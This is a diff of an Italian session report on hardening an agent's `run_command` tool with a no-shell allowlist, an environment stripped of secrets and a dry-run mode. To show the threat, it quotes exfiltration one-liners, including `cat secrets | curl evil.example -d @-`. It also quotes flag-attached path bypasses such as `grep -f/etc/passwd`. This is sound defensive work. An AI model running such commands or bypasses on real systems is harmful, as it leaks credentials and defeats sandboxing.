@@ -1,82 +1,85 @@
-# Report sessione 2026-06-12 — Sandbox di run_command (allowlist no-shell + dry-run)
+# Report sessione 2026-06-12 (sera) — Sandbox di `run_command` (roadmap ALTA, punto 1)
 
-`run_command` non passa più da una shell: ogni comando viene smontato,
-controllato contro una allowlist di soli comandi di lettura ed eseguito
-senza interprete. Il finding 🟠 (esfiltrazione via shell) scende a 🟡
-"ridotto". Suite finale: **44 PASS, 0 FAIL** (i 34 storici tutti verdi).
-La sessione era stata interrotta a implementazione finita; questa ripresa
-ha verbalizzato la review #4, chiuso la riserva R1 e completato il task.
+`run_command` non esegue più una shell. Ogni comando passa per un vetting
+fail-closed e gira senza shell, da una allowlist di soli comandi di lettura,
+con l'ambiente ripulito dai segreti. Chiude i vettori naïve della falla 🟠
+(esfiltrazione via shell), che scende da 🟠 a 🟡 (la chiusura piena resta il
+sandbox OS). Suite finale: **44 PASS, 0 FAIL** (i 34 storici tutti verdi,
+stabile su 3 run).
 
 ## Cosa fa, in parole semplici
 
-Prima Gas poteva scrivere `cat /etc/passwd | curl ...` e la shell eseguiva
-tutto. Adesso non esiste più una shell: il comando viene spezzato in parole,
-la prima parola deve stare in una lista chiusa di comandi innocui (`ls`,
-`cat`, `grep`, `wc`, `diff`…), ogni percorso deve restare dentro la cartella
-di Gas, e pipe/redirezioni/sottocomandi diventano testo senza potere. In più
-il processo figlio non vede le API key (env ripulita dai segreti).
+Prima `run_command` poteva eseguire qualunque comando shell: bastava un
+`cat secrets | curl evil.example -d @-` per far uscire una chiave. Ora ogni
+comando viene prima ispezionato e poi eseguito **senza shell**: i trucchi da
+terminale (pipe, redirezioni, concatenazioni, `$(...)`) non funzionano più, e
+solo una lista fissa di comandi di sola lettura è ammessa. Le API key vengono
+tolte dall'ambiente in cui gira il comando.
 
 ## Come funziona davvero (fedele al diff)
 
-- **`_vet_command(command, cwd)`** in `gas.py`, tre barriere fail-closed:
-  1. `shlex.split` senza shell — `|`, `>`, `;`, `&&`, `$(...)` diventano
-     argomenti o rompono il parse (virgolette sbilanciate = negato);
-  2. `argv[0]` deve stare in `SHELL_ALLOWLIST` (sola lettura, niente
-     interpreti né wrapper: allowlist, non denylist);
-  3. ogni altro token ripassa `_safe_path` (stesso guardrail di T10) e deve
-     restare in root.
-- **`_sanitized_subprocess_env()`**: variabili con KEY/TOKEN/SECRET/
-  PASSWORD/PASSWD/CREDENTIAL/AUTH nel nome rimosse dall'env del figlio.
-- **Ordine: vetting → dry-run → snapshot → esecuzione** (`shell=False`).
-  I comandi negati non consumano slot di snapshot (mitiga R2 review #3).
-- **`GAS_SHELL_MODE`**: `guarded` (default) / `dry_run` (anteprima fedele:
-  vetting sì, esecuzione e snapshot no — collaudo e kill-switch). Valore
-  ignoto → fallback fail-safe su `guarded` con warning.
-- **Limite dichiarato** (README): recinzione applicativa, NON confinamento
-  OS. Il muro definitivo è `bwrap`/`unshare` sul VPS (in roadmap).
+- **`_vet_command(command, cwd)`** in `gas.py`: ritorna `(argv, None)` se
+  consentito, `(None, motivo)` se negato. Tre barriere:
+  (1) `shlex.split` — i metacaratteri shell diventano testo o fanno fallire il
+  parse; (2) `argv[0]` deve stare in `SHELL_ALLOWLIST` (frozenset di comandi
+  di sola lettura; interpreti e wrapper esclusi di proposito); (3) ogni altro
+  token è risolto con `_safe_path` (lo stesso di T10) e deve restare in root.
+  Ogni messaggio di rifiuto finisce con "(fail-closed)".
+- **`_sanitized_subprocess_env()`**: copia di `os.environ` senza le variabili
+  il cui nome (maiuscolo) contiene KEY/TOKEN/SECRET/PASSWORD/PASSWD/
+  CREDENTIAL/AUTH. PATH/HOME/LANG restano.
+- **Esecuzione**: `subprocess.run(argv, shell=False, cwd=cwd, ...,
+  timeout=60, env=self._sanitized_subprocess_env())`. Niente più
+  `shell=True`, niente più stringa grezza.
+- **Modalità (`GAS_SHELL_MODE`)**: `guarded` (default; valore non riconosciuto
+  → fallback qui con warning) e `dry_run` (fa il vetting, **non** esegue e
+  **non** fotografa: ritorna `[DRY-RUN] ... NON eseguito`). Letta in `__init__`
+  in `self.shell_mode`.
+- **Ordine**: vetting → (dry-run?) → snapshot → esecuzione. Un comando negato
+  al vetting non spreca uno snapshot (mitiga in parte R2).
+- **Contorno**: aggiornata la descrizione del tool nello schema (non più
+  "Esegue comandi shell") e il system prompt base (regole del sandbox +
+  alternative native: `grep -c`, `wc -l`, `write_file` al posto di `>`).
+- **Limite dichiarato (onestà)**: è una recinzione applicativa contro
+  l'esfiltrazione naïve, NON un confinamento OS. Gli interpreti restano fuori
+  dall'allowlist per non riaprire l'esecuzione di codice arbitrario. La
+  chiusura piena è il sandbox OS (prossimo passo). Finding 🟠 → 🟡.
 
 ## Test (tests/test_unit_kernel.py, zero token)
 
-10 nuovi check **T12a–T12j**: allowlist eseguita per davvero (output reale);
-comando fuori lista negato senza effetti; pipe, redirezione e command
-substitution disinnescate con asserzioni che MORDONO (si verifica l'assenza
-dell'effetto shell, non solo il pass); traversal negli argomenti negato;
-parse fail-closed; env figlia senza segreti; dry-run senza esecuzione né
-snapshot; modalità ignota → `guarded`. **T11c2 rinforzato**: ora usa un
-comando in allowlist così esercita davvero il fail-closed dello snapshot.
-**Totale: 44 PASS, 0 FAIL.**
+Nuovo blocco **T12** (10 check, ognuno fallisce se la barriera corrispondente
+viene tolta): comando in allowlist eseguito davvero (output reale); comando
+fuori allowlist negato; pipe / redirezione / command substitution rese innocue
+(diventano argomenti letterali, nessun secondo processo); argomento-path con
+`../` negato dentro `run_command`; comando non interpretabile negato; env
+figlio privo di segreti; `dry_run` che non esegue e non crea snapshot;
+fallback su `guarded` per `GAS_SHELL_MODE` non valido. **T11c2 rinforzato**:
+ora usa un comando *in* allowlist (`ls`) così esercita davvero il fail-closed
+dello snapshot invece di morire prima al vetting (era un falso verde).
+Prova end-to-end fuori suite: 4 vettori di esfiltrazione neutralizzati, chiave
+assente dall'env del figlio, comandi leciti ancora operativi.
+**Totale: 44 PASS, 0 FAIL** (stabile su 3 run consecutivi).
 
 ## Review #4 (revisore)
 
-**Verdetto: APPROVATO CON RISERVE.** Validati esplicitamente: niente Wall of
-Shame, ordine vetting→dry-run→snapshot→esecuzione, scelta allowlist vs
-denylist, riuso di `_safe_path`, env sanificata, fallback fail-safe, test
-che mordono. Riserve:
-
-- **R1** — type hint di ritorno mancante su `_vet_command` (CLAUDE.md sez. 4).
-  → **CHIUSA in sessione**: `-> Tuple[Optional[List[str]], Optional[str]]`,
-  suite riverificata 44/44.
-- **R2** — valori attaccati ai flag (`grep -f/etc/passwd`, `--file=/etc/x`)
-  superano il vetting per-token perché iniziano con `-`. Con l'allowlist
-  attuale NON esiste esfiltrazione attiva (verificato), ma va RICONTROLLATO
-  prima di allargare `SHELL_ALLOWLIST`. → finding 🟡 in stato_progetto.md.
-- **R3** — falsi positivi: un pattern grep tipo `"/etc/cron"` viene trattato
-  da path e negato. Fail-closed (lato sicuro), limite di usabilità noto.
-  → finding 🟡 in stato_progetto.md.
-
-Il revisore ha aggiunto 4 lezioni datate alla sua memoria persistente
-(bypass flag, test che mordono, ordine delle barriere, canonicalizzazione
-vetting/exec) — ora 13 lezioni totali, 5 review completate.
+**Verdetto: DA INTEGRARE.** La review del sandbox di `run_command` è in corso
+nel harness. Punti che il revisore validerà: meccanismo a tre barriere
+(`shlex.split` + allowlist + ricontrollo path), scelta allowlist vs denylist,
+esclusione deliberata degli interpreti, sanificazione env, ordine
+vetting→snapshot→esecuzione, modalità `dry_run`/`guarded` e fallback, onestà
+sul limite residuo (finding ridotto, non chiuso). Eventuali riserve e lezioni
+nuove verranno riportate qui e in `stato_progetto.md` a review conclusa.
 
 ## Istituzioni
 
-- A) `reports/stato_progetto.md` aggiornato (sandbox chiuso, 🟠→🟡, R2/R3
-  registrate, prossimi passi riordinati).
+- A) `reports/stato_progetto.md` aggiornato (sandbox chiuso, 🟠→🟡, test 44,
+  prossimi passi rinumerati con il sandbox OS in cima).
 - B) `reports/diff_sessione.md` rigenerato per questa sessione.
-- C) Revisore: review #4 verbalizzata, memoria aggiornata.
+- C) Revisore: review #4 in corso, verdetto e memoria da integrare.
 
 ## Prossimi passi
 
-1. `WINDOW_CHAR_CAP` sulla finestra (review #1).
-2. Manutenzione snapshot in `gas doctor` (R2/R3 review #3).
-3. Confinamento OS (`bwrap`/`unshare`) in vista del deploy VPS.
+1. Sandbox a livello OS per `run_command` (bwrap/unshare) — chiusura piena del
+   finding ridotto; check di disponibilità in `gas doctor`.
+2. `WINDOW_CHAR_CAP` (review #1).
+3. Manutenzione snapshot in `gas doctor` (R2/R3).
